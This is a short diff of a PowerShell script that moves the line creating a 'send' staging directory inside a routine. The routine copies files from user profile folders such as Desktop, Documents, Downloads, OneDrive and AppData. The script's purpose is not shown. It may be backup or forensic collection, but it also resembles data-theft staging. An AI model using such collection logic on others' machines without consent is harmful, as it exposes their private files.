@@ -22,7 +22,7 @@ function SearchAndCopy ($LocalPath, $Second) {
             if (Test-Path -Path (Join-Path $allDestDir $file.Name)) {
                 Copy-Item $file.FullName -Destination ($allDestDir + '\' + $file.BaseName + "_$num" + $file.Extension) -Recurse -Container
                 if ($Second) {
-                    $sendDestDir = $destDir + $objName + '_' + $CurrDateTime; New-Item $sendDestDir -ItemType Directory -ea 0 
+                    #$sendDestDir = $destDir + $objName + '_' + $CurrDateTime; New-Item $sendDestDir -ItemType Directory -ea 0 
                     Copy-Item $file.FullName -Destination ($sendDestDir + '\' + $file.BaseName + "_$num" + $file.Extension) -Recurse -Container 
                 }
                 $num+=1
@@ -112,6 +112,7 @@ $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive', 'AppData')
     
     if ($Stream) {
         $etalonhash = (Get-FileHash -Algorithm MD5 $hashfile).hash
+        $sendDestDir = $destDir + $objName + '_' + $CurrDateTime; New-Item $sendDestDir -ItemType Directory -ea 0
         
         Secure-Copy -param $true
 
